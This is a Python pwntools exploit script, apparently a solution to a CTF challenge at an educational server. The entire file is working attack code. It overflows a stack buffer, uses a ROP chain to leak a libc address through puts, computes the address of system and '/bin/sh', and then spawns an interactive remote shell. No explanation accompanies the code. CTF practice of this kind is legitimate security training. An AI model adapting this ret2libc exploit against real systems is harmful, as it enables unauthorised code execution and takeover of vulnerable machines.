from pwn import *

context.update(arch="amd64", os="linux")

r = remote('edu-ctf.csie.org', 10175)

pop_rdi = 0x0000000000400733
pop_rsi_pop_r15 = 0x0000000000400731
puts_plt = 0x0000000000400520
gets_plt = 0x0000000000400530
libc_start_got = 0x0000000000600ff0
system_offset = 0x000000000004f440
main = 0x0000000000400698
ret = 0x0000000000400506


e = ELF("./libc.so")

payload = b"A"* 0x38
payload += p64(pop_rdi) + p64(libc_start_got) + p64(puts_plt) + p64(main)
r.sendline(payload)
r.recvline()
libc = u64(r.recv(6) + b'\0\0') - 0x021ab0

system = libc + system_offset
sh = libc + e.search('/bin/sh').__next__()

payload = b"A" * 0x38 + p64(ret)
payload += p64(pop_rdi) + p64(sh) + p64(system)

r.sendline(payload)

r.interactive()
